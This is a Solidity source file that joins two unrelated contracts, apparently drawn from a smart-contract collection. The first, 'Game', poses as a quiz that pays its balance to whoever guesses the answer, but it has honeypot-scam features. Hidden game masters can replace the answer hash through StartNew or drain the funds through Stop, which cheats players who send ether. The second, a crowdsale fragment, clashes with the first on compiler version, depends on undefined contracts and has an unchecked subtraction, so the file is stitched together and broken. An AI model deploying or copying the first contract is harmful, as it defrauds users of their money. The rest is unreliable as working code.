pragma solidity ^0.4.24;

contract Game
{
    string public question;
    bytes32 responseHash;
    mapping(bytes32 => bool) gameMaster;

    function Guess(string _response) external payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value >= 0.25 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }

    function Start(string _question, string _response) public payable onlyGameMaster {
        if(responseHash==0x0){
            responseHash = keccak256(_response);
            question = _question;
        }
    }

    function Stop() public payable onlyGameMaster {
        msg.sender.transfer(this.balance);
    }

    function StartNew(string _question, bytes32 _responseHash) public payable onlyGameMaster {
        question = _question;
        responseHash = _responseHash;
    }

    constructor(bytes32[] _gameMasters) public{
        for(uint256 i=0; i< _gameMasters.length; i++){
            gameMaster[_gameMasters[i]] = true;
        }
    }

    modifier onlyGameMaster(){
        require(gameMaster[keccak256(msg.sender)]);
        _;
    }

    function() public payable{}
}
pragma solidity ^0.3.0;
	 contract IQNSecondPreICO is Ownable {
    uint256 public constant EXCHANGE_RATE = 550;
    uint256 public constant START = 1515402000; 
    uint256 availableTokens;
    address addressToSendEthereum;
    address addressToSendTokenAfterIco;
    uint public amountRaised;
    uint public deadline;
    uint public price;
    token public tokenReward;
    mapping(address => uint256) public balanceOf;
    bool crowdsaleClosed = false;
    function IQNSecondPreICO (
        address addressOfTokenUsedAsReward,
       address _addressToSendEthereum,
        address _addressToSendTokenAfterIco
    ) public {
        availableTokens = 800000 * 10 ** 18;
        addressToSendEthereum = _addressToSendEthereum;
        addressToSendTokenAfterIco = _addressToSendTokenAfterIco;
        deadline = START + 7 days;
        tokenReward = token(addressOfTokenUsedAsReward);
    }
    function () public payable {
        require(now < deadline && now >= START);
        require(msg.value >= 1 ether);
        uint amount = msg.value;
        balanceOf[msg.sender] += amount;
        amountRaised += amount;
        availableTokens -= amount;
        tokenReward.transfer(msg.sender, amount * EXCHANGE_RATE);
        addressToSendEthereum.transfer(amount);
    }
 }
